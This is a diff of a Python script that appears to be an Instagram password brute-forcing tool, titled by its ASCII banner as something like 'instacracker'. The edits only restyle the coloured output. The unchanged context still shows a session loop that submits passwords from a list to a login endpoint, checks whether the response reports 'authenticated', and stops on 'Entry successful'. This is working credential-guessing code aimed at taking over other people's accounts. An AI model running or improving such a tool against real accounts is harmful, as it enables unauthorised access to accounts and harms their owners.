@@ -1,11 +1,11 @@
 import requests
 import time
-from colorama import Fore
+from colorama import Fore, Style
 from os import system
 
 system("cls||clear")
 
-print("""
+print(r"""
  /$$                       /$$                                                       /$$                          
 |__/                      | $$                                                      | $$                          
  /$$ /$$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$ 
@@ -56,10 +56,10 @@ with requests.Session() as session:
                 try:
                     login_data = login_response.json()
                     if login_data.get('authenticated'):
-                        print(Fore.LIGHTGREEN_EX + "Entry successful: " + Fore.LIGHTBLACK_EX + f"{passw.strip()}")
+                        print(f"{Fore.LIGHTGREEN_EX}[+] Entry successful: {Style.RESET_ALL}{passw.strip()}")
                         break
                     else:
-                        print(Fore.LIGHTRED_EX + "wrong password: " + Fore.LIGHTBLACK_EX + f"{passw.strip()}")
+                        print(f"{Fore.LIGHTRED_EX}[-] wrong password: {Style.RESET_ALL}{passw.strip()}")
                 except ValueError:
                     print(Fore.LIGHTRED_EX + "Invalid response:", login_response.text)
                 time.sleep(2)
